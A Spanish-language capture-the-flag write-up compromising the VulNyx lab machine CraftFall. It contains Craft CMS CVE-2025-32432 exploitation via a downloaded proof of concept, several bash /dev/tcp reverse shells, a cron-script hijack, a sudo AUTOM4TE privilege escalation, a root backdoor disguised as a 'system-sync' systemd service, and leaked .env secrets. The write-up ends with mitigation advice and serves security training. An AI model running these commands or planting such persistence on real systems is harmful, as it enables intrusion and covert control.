---
title: "VulNyx: CraftFall"
date: 2026-10-03
draft: false
plataforma: "VulNyx"
tags: ["ctf", "vulnyx", "linux", "craftcms", "cve-2025-32432", "cron", "privilege-escalation", "sudo", "autoconf", "persistence", "systemd"]
categories: ["writeups"]
summary: "Resolución de CraftFall, una máquina Linux de VulNyx: ejecución remota de código en Craft CMS mediante CVE-2025-32432, movimiento lateral a través de un script programado con permisos de escritura, escalada a root mediante abuso de sudo y variable AUTOM4TE en autoconf, y persistencia mediante un servicio systemd."
sistema: ["linux"]
dificultad: "principiante"
---

*Un recorrido técnico y estructurado de la máquina CraftFall, centrado en la explotación remota de una vulnerabilidad en Craft CMS (CVE-2025-32432), la elevación a una cuenta de usuario local mediante una tarea programada mal configurada, la escalada de privilegios a root explotando la directiva env_keep en sudo con autoconf y el establecimiento de persistencia mediante un servicio de systemd.*

**Publicado el 3 de octubre de 2026 · Por Ne0t3k · 10 minutos de lectura**

CraftFall es una máquina Linux de VulNyx. El compromiso inicial se basa en el despliegue de una instancia desactualizada de Craft CMS (versión 5.6.16) expuesta en el servicio web. La falta de sanitización y el enrutamiento vulnerable permiten encadenar el envenenamiento de sesiones con la inclusión de archivos para lograr ejecución remota de código no autenticada como `www-data`.

Una vez obtenido acceso al sistema, la enumeración interna identifica una tarea periódica ejecutada por el usuario `zer0arc4` que invoca un script con permisos totales de escritura para cualquier usuario. Modificar dicho archivo permite obtener una shell interactiva con los privilegios de ese usuario. Desde este punto, la configuración de `sudo` permite ejecutar el binario `/usr/bin/autoconf` preservando la variable de entorno `AUTOM4TE`, lo que facilita la ejecución de comandos arbitrarios como `root`. Finalmente, se implementa persistencia administrativa mediante un temporizador/servicio en `systemd`.

IP objetivo: `10.0.2.9`. IP atacante: `10.0.2.3`. Las credenciales internas y las flags se muestran parcialmente censuradas para preservar el carácter formativo del laboratorio.

## Reconocimiento — Descubrimiento de host

El primer paso consiste en realizar un barrido de red en el segmento local para identificar la dirección IP asignada a la máquina virtual:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> nmap -sP 10.0.2.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 16:08 +0200
Nmap scan report for 10.0.2.1
Host is up (0.00093s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00051s latency).
MAC Address: 08:00:27:E4:CC:FA (Oracle VirtualBox virtual NIC)
<span class="hl">Nmap scan report for 10.0.2.9</span>
<span class="hl">Host is up (0.0010s latency).</span>
<span class="hl">MAC Address: 08:00:27:68:6E:0A (Oracle VirtualBox virtual NIC)</span>
Nmap scan report for 10.0.2.3
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 11.07 seconds
</pre>

Se identifican cuatro hosts activos en el rango:

- `10.0.2.3`: máquina atacante (Kali Linux).
- `10.0.2.9`: máquina objetivo con dirección física asociada a VirtualBox (`08:00:27:68:6E:0A`).

## Reconocimiento — Escaneo de puertos y servicios

Con la dirección IP identificada, se lanza un escaneo exhaustivo sobre todo el rango de puertos TCP con detección de versiones, scripts predeterminados y análisis de fingerprinting:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> nmap -sSV -A -p- --open -n 10.0.2.9</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 16:08 +0200
Nmap scan report for 10.0.2.9
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="hl">22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)</span>
<span class="hl">80/tcp open  http    Apache httpd 2.4.68</span>
<span class="hl">|_http-server-header: Apache/2.4.68 (Debian)</span>
<span class="hl">|_http-title: Did not follow redirect to http://craft.nyx/</span>
MAC Address: 08:00:27:68:6E:0A (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 1 hop
Service Info: Host: 192.168.1.82; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT    ADDRESS
1   1.17 ms 10.0.2.9
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.32 seconds
</pre>

El escaneo revela dos servicios activos:

- **22/TCP — SSH:** OpenSSH 10.0p2 ejecutándose sobre Debian.
- **80/TCP — HTTP:** Apache httpd 2.4.68, el cual fuerza una redirección HTTP hacia el dominio virtual `craft.nyx`.

Se añade la entrada correspondiente al archivo de resolución local `/etc/hosts` para interactuar de forma adecuada con el servidor web:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> echo "10.0.2.9 craft.nyx" | sudo tee -a /etc/hosts</span>
[sudo] contraseña para kali:
10.0.2.9 craft.nyx
</pre>

## Enumeración web — Detección de Craft CMS

Con el dominio resuelto, se efectúa un fuzzing de directorios y extensiones web mediante `gobuster`:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> gobuster dir -u http://craft.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 40 -q</span>
index (Status: 200) [Size: 6248]
index.php (Status: 200) [Size: 6248]
admin (Status: 302) [Size: 0] [--> http://craft.nyx/admin/login]
logout (Status: 302) [Size: 0] [--> http://craft.nyx/]
</pre>

El panel de administración redirige a `/admin/login`. Al consultar el cuerpo de la página principal mediante `curl`, se confirma la presencia de Craft CMS y la estructura de plantillas Twig:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> curl -s -L http://craft.nyx/ | grep -iE 'craft|version|docs' -C 2</span>

Welcome to Craft CMS

--
body {
background-color: hsl(212, 50%, 93%);
background-image: url("http://craft.nyx/cpresources/fc8e9008/images/installer-bg.png?v=1744129370");
background-repeat: no-repeat;
background-size: cover;
--

Welcome

Thanks for installing Craft CMS!

You’re looking at the index.twig template file located in your
templates/ folder. Once you’re ready to start building out your site’s
front end, you can replace this with something custom.

[Go to your control panel](http://craft.nyx/admin)
--
Popular Resources

[Tutorial](https://craftcms.com/docs/getting-started-tutorial/)
Learn the basics.
[Documentation](https://craftcms.com/docs/5.x/)
Read the official docs.
</pre>

## Explotación inicial — CVE-2025-32432 en Craft CMS

La instalación corresponde a una versión vulnerable de Craft CMS afectada por la vulnerabilidad **CVE-2025-32432**, un fallo que permite la ejecución remota de código no autenticada mediante manipulación de parámetros en transformaciones de recursos, envenenamiento de sesiones PHP e inclusión arbitraria del archivo de sesión en el sistema de ficheros.

Se descarga el exploit de prueba de concepto para evaluar la ejecución de comandos:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> curl -s -L https://raw.githubusercontent.com/theeomega/CVE-2025-32432-POC/main/exploit.py -o cve-2025-32432.py</span>
</pre>

Se valida la vulnerabilidad ejecutando el comando básico `id`:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> python3 cve-2025-32432.py -u http://craft.nyx/ -c "id"</span>
[*] Target: http://craft.nyx
[*] Front controller: index.php
[+] CSRF token found via http://craft.nyx/index.php?p=admin/dashboard
[*] Testing endpoint: http://craft.nyx/index.php?p=admin/actions/assets/generate-transform
assetId 0 -&gt; HTTP 200
[+] phpinfo triggered
[+] Working endpoint: http://craft.nyx/index.php?p=admin/actions/assets/generate-transform
[+] Working assetId: 0
[+] Saved phpinfo_success.html
[+] Vulnerability confirmed by phpinfo gadget
[*] Poisoning session with PHP command payload
[*] Session poison HTTP status: 200
[+] Session ID: 4f33553a5547a6aa447ccac739e3586c
[+] CSRF token: UdstjJ1n5psOQG8cr2lvGY_9w9h06Y-7eV0L16Mj5incm-_DA89kMDWwSvutKpSrfDA3UcpfIHXOxaq3Q67BzgAueLrMTqxCmsKhhWyqBmo=
[*] Trying session file: /var/lib/php/sessions/sess_4f33553a5547a6aa447ccac739e3586c
[*] Trigger HTTP status: 200
<span class="hl-green">[+] Command output:</span>
<span class="hl-green">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
</pre>

Confirmada la ejecución bajo el usuario `www-data`, se pone en escucha un puerto TCP en la máquina atacante y se despacha una reverse shell codificada en Bash:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> nc -lvnp 443</span>
listening on [any] 443 ...
</pre>

En otra terminal se dispara la invocación del payload:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> python3 cve-2025-32432.py -u http://craft.nyx/ -c "bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.3/443 0&gt;&amp;1'"</span>
[*] Target: http://craft.nyx
[*] Front controller: index.php
[+] CSRF token found via http://craft.nyx/index.php?p=admin/dashboard
[*] Testing endpoint: http://craft.nyx/index.php?p=admin/actions/assets/generate-transform
assetId 0 -&gt; HTTP 200
[+] phpinfo triggered
[+] Working endpoint: http://craft.nyx/index.php?p=admin/actions/assets/generate-transform
[+] Working assetId: 0
[+] Saved phpinfo_success.html
[+] Vulnerability confirmed by phpinfo gadget
[*] Poisoning session with PHP command payload
[*] Session poison HTTP status: 200
[+] Session ID: cc81e6c5549c7bf2963ac2ca01a57e44
[+] CSRF token: 65ufGyAlZ4T-OekZPkBUtyo6xE4s8aUSpp4Q8PrNYHWjojOm2_RC4t_8xS1KSQvbqU6hT3gJOuVcSLR_HYbyRZOrdb2bujUYlcRZxZ6sDKM=
[*] Trying session file: /var/lib/php/sessions/sess_cc81e6c5549c7bf2963ac2ca01a57e44
</pre>

El socket recibe la conexión entrante y se procede a realizar el tratamiento de la TTY para trabajar de forma estable:

<pre class="term-log">
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.9] 38412
bash: cannot set terminal process group (775): Inappropriate ioctl for device
bash: no job control in this shell
<span class="cmd">www-data@Craftfall:/var/www/craft/web$ id && hostname</span>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Craftfall
<span class="cmd">www-data@Craftfall:/var/www/craft/web$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
www-data@Craftfall:/var/www/craft/web$ export TERM=screen-256color
www-data@Craftfall:/var/www/craft/web$ source /etc/skel/.bashrc
www-data@Craftfall:/var/www/craft/web$ ^Z
zsh: suspended nc -lvnp 443
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> stty raw -echo;fg</span>
[1] + continued nc -lvnp 443
www-data@Craftfall:/var/www/craft/web$
</pre>

## Enumeración interna y movimiento lateral

Con acceso inicial establecido como `www-data`, se recopilan usuarios locales del sistema, privilegios de `sudo` y binarios con bit SUID:

<pre class="term-log">
<span class="cmd">www-data@Craftfall:/var/www/craft/web$ sudo -l</span>
[sudo] password for www-data:
sudo: a password is required

<span class="cmd">www-data@Craftfall:/var/www/craft/web$ grep -E 'bash|sh' /etc/passwd</span>
root:x:0:0:root:/root:/bin/bash
<span class="hl">zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash</span>

<span class="cmd">www-data@Craftfall:/var/www/craft/web$ find / -perm -4000 -type f 2&gt;/dev/null</span>
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
</pre>

Se examinan los archivos de configuración y credenciales del CMS en `/var/www/craft/.env`:

<pre class="term-log">
<span class="cmd">www-data@Craftfall:/var/www/craft/web$ cat /var/www/craft/.env 2&gt;/dev/null | grep -v '^#'</span>
CRAFT_APP_ID=CraftCMS--b00fa317-e08c-4e3f-b2da-ccd3c813e468
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=dIKL60H7TRSJMxoCDXAe1BuugPTe8zN4
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
DB_DRIVER="mysql"
DB_SERVER="127.0.0.1"
DB_PORT="3306"
DB_DATABASE="craftdb"
DB_USER="rudra"
DB_PASSWORD="CraftDB@...!"
PRIMARY_SITE_URL=http://craft.nyx/
</pre>

Al revisar `/usr/local/bin/`, se localiza un script con permisos permisivos (`777`) perteneciente al usuario `zer0arc4`:

<pre class="term-log">
<span class="cmd">www-data@Craftfall:/var/www/craft/web$ ls -la /usr/local/bin/</span>
total 3572
drwxr-xr-x  2 root     root        4096 Sep 20 09:56 .
drwxr-xr-x 11 root     root        4096 Sep 19 13:39 ..
-rwxr-xr-x  1 root     root     3642137 Sep 19 14:13 composer
<span class="hl">-rwxrwxrwx  1 zer0arc4 zer0arc4     348 Sep 20 10:03 zer0arc4-job.sh</span>

<span class="cmd">www-data@Craftfall:/var/www/craft/web$ cat /usr/local/bin/zer0arc4-job.sh</span>
#!/bin/bash
echo "zer0arc4 scheduled task executed: $(date)" &gt;&gt; /tmp/zer0arc4-job.log
Hi dude,
The machine is almost 70% complete! The actual vulnerability is in Craft CMS 5.6.16 itself.
Make sure to escalate to root to fully complete the machine.
Feel free to share your feedback or suggestions on Discord.
Thanks!
— zer0arc4.
</pre>

Dado que el archivo tiene permisos de escritura universal y es ejecutado periódicamente por una tarea en segundo plano de `zer0arc4`, se prepara un listener en el puerto 4444 de la máquina atacante y se inyecta una reverse shell al final del script:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> nc -lvnp 4444</span>
listening on [any] 4444 ...
</pre>

<pre class="term-log">
<span class="cmd">www-data@Craftfall:/var/www/craft/web$ echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.3/4444 0&gt;&amp;1'" &gt;&gt; /usr/local/bin/zer0arc4-job.sh</span>
</pre>

Al transcurrir el intervalo del cron, la tarea se ejecuta y devuelve una sesión interactiva bajo el contexto de `zer0arc4`:

<pre class="term-log">
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.9] 44058
bash: cannot set terminal process group (3795): Inappropriate ioctl for device
bash: no job control in this shell
<span class="cmd">zer0arc4@Craftfall:/$ id && hostname</span>
<span class="hl-green">uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),104(bluetooth)</span>
Craftfall
<span class="cmd">zer0arc4@Craftfall:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
zer0arc4@Craftfall:/$ export TERM=screen-256color
zer0arc4@Craftfall:/$ source /etc/skel/.bashrc
zer0arc4@Craftfall:/$ ^Z
zsh: suspended nc -lvnp 4444
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> stty raw -echo;fg</span>
[1] + continued nc -lvnp 4444
zer0arc4@Craftfall:/$
</pre>

## Escalada de privilegios — Abuso de AUTOM4TE con autoconf

Con la sesión de `zer0arc4` estabilizada, se evalúan las reglas de elevación asignadas en el archivo de sudoers:

<pre class="term-log">
<span class="cmd">zer0arc4@Craftfall:/$ sudo -l</span>
Matching Defaults entries for zer0arc4 on Craftfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, <span class="hl">env_keep+=AUTOM4TE</span>

User zer0arc4 may run the following commands on Craftfall:
    <span class="hl">(root) NOPASSWD: /usr/bin/autoconf</span>
</pre>

El análisis del comando y sus directivas revela dos elementos críticos:

- `zer0arc4` puede ejecutar `/usr/bin/autoconf` como `root` sin proporcionar contraseña.
- Se preserva explícitamente la variable de entorno `AUTOM4TE` a través de la directiva `env_keep+=AUTOM4TE`.

El script `autoconf` recurre internamente a la utilidad `autom4te` para procesar archivos de configuración M4. Si la variable de entorno `AUTOM4TE` está definida en el momento de la ejecución, `autoconf` invoca la ruta especificada en dicha variable en lugar del binario habitual del sistema.

Para explotar este comportamiento, se crea un script ejecutable en `/tmp/pwn.sh` que invoca una shell con privilegios preservados (`bash -p`), se genera un archivo `configure.ac` vacío en el directorio de trabajo para satisfacer la comprobación inicial de `autoconf`, y se ejecuta el binario delegando en la variable de entorno controlada:

<pre class="term-log">
<span class="cmd">zer0arc4@Craftfall:/$ cd /tmp</span>
<span class="cmd">zer0arc4@Craftfall:/tmp$ echo '#!/bin/bash' &gt; /tmp/pwn.sh</span>
<span class="cmd">zer0arc4@Craftfall:/tmp$ echo 'bash -p' &gt;&gt; /tmp/pwn.sh</span>
<span class="cmd">zer0arc4@Craftfall:/tmp$ chmod +x /tmp/pwn.sh</span>
<span class="cmd">zer0arc4@Craftfall:/tmp$ touch /tmp/configure.ac</span>
<span class="cmd">zer0arc4@Craftfall:/tmp$ AUTOM4TE=/tmp/pwn.sh sudo /usr/bin/autoconf</span>
<span class="hl-green">root@Craftfall:/tmp# id && whoami</span>
<span class="hl-green">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="hl-green">root</span>
</pre>

## Persistencia — Servicio del sistema (systemd)

Con acceso total como `root`, se despliega un mecanismo de persistencia administrativo para garantizar el acceso al entorno de laboratorio ante reinicios imprevistos.

Se crea un script de sincronización en `/usr/local/bin/system-sync.sh`:

<pre class="term-log">
<span class="cmd">root@Craftfall:/tmp# cat &lt;&lt; 'EOF' &gt; /usr/local/bin/system-sync.sh</span>
#!/bin/bash
/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.3/4445 0&gt;&amp;1'
EOF
<span class="cmd">root@Craftfall:/tmp# chmod 700 /usr/local/bin/system-sync.sh</span>
</pre>

A continuación, se define una unidad de servicio de `systemd` en `/etc/systemd/system/system-sync.service`:

<pre class="term-log">
<span class="cmd">root@Craftfall:/tmp# cat &lt;&lt; 'EOF' &gt; /etc/systemd/system/system-sync.service</span>
[Unit]
Description=System Network Synchronization
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/system-sync.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
</pre>

Se recarga la configuración del daemon de `systemd`, se habilita el servicio en el arranque y se inicia su ejecución:

<pre class="term-log">
<span class="cmd">root@Craftfall:/tmp# systemctl daemon-reload</span>
<span class="cmd">root@Craftfall:/tmp# systemctl enable system-sync.service</span>
Created symlink '/etc/systemd/system/multi-user.target.wants/system-sync.service' → '/etc/systemd/system/system-sync.service'.
<span class="cmd">root@Craftfall:/tmp# systemctl start system-sync.service</span>
</pre>

En la máquina atacante, el listener a la escucha en el puerto 4445 recibe de inmediato la sesión persistente como `root`:

<pre class="term-log">
<span class="cmd">kali@ne0t3k ~/Documentos/WriteUps/CraftFall</span>
<span class="cmd"> nc -lvnp 4445</span>
listening on [any] 4445 ...
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.9] 52110
bash: cannot set terminal process group (4237): Inappropriate ioctl for device
bash: no job control in this shell
<span class="cmd">root@Craftfall:/# id && hostname</span>
<span class="hl-green">uid=0(root) gid=0(root) groups=0(root)</span>
Craftfall
</pre>

## Obtención de flags

Con el sistema comprometido por completo, se recuperan las evidencias de usuario y root:

### Flag de usuario

<pre class="term-log">
<span class="cmd">root@Craftfall:/tmp# cat /home/zer0arc4/user.txt</span>
<span class="hl-green">f9020bb8...0434d18</span>
</pre>

### Flag de root

<pre class="term-log">
<span class="cmd">root@Craftfall:/tmp# cat /root/root.txt</span>
<span class="hl-green">b0c8813f...8c9c85c</span>
</pre>

## Conclusión

La máquina CraftFall ilustra cómo la falta de gestión de actualizaciones en aplicaciones web de terceros puede derivar en la toma de control completa del sistema operativo subyacente. La vulnerabilidad CVE-2025-32432 en Craft CMS 5.6.16 permite eludir los mecanismos de autenticación y ejecutar comandos en el contexto del usuario de servicio web (`www-data`).

El pivote hacia un usuario estándar (`zer0arc4`) queda facilitado por prácticas de administración deficientes: la asignación de permisos de escritura universal (`777`) sobre scripts de automatización ubicados en directorios compartidos del sistema.

Por último, la escalada de privilegios a `root` demuestra el riesgo de flexibilizar la conservación de variables de entorno en las reglas de `sudo` (`env_keep`). Al permitir la ejecución de `autoconf` conservando `AUTOM4TE`, se otorga indirectamente ejecución de código arbitrario como superusuario, eludiendo cualquier control restrictivo sobre el binario invocado.

## Recomendaciones de mitigación

**Actualización periódica de gestores de contenido:** actualizar Craft CMS a una versión corregida posterior a la 5.6.16. Mantener un inventario de software actualizado y aplicar parches de seguridad críticos reduce la superficie frente a vulnerabilidades públicas no autenticadas.

**Aislamiento y mínimos privilegios del servidor web:** el usuario `www-data` debe ejecutarse con permisos estrictos de lectura y escritura acotados exclusivamente a las carpetas requeridas para activos temporales o subidas de ficheros, deshabilitando la capacidad de interactuar con utilidades fuera de su alcance operativo.

**Gestión de permisos en scripts y tareas programadas:** los scripts ejecutados periódicamente mediante `cron` o `systemd` bajo perfiles privilegiados o de usuario nunca deben poseer permisos de escritura universal (`777` o `o+w`). Su propiedad debe pertenecer a `root` o al usuario que los ejecuta, limitando los permisos de modificación a `750` o `700`.

**Endurecimiento de directivas en sudoers:** evitar el uso indiscriminado de `env_keep` con variables de entorno que condicionen la resolución de submódulos o scripts auxiliares (como `AUTOM4TE`, `LD_PRELOAD` o `PYTHONPATH`). Si un binario requiere ser invocado como `root` mediante `sudo`, debe restringirse la sobreescritura de su entorno de ejecución (`env_reset`) y validar los argumentos pasados.
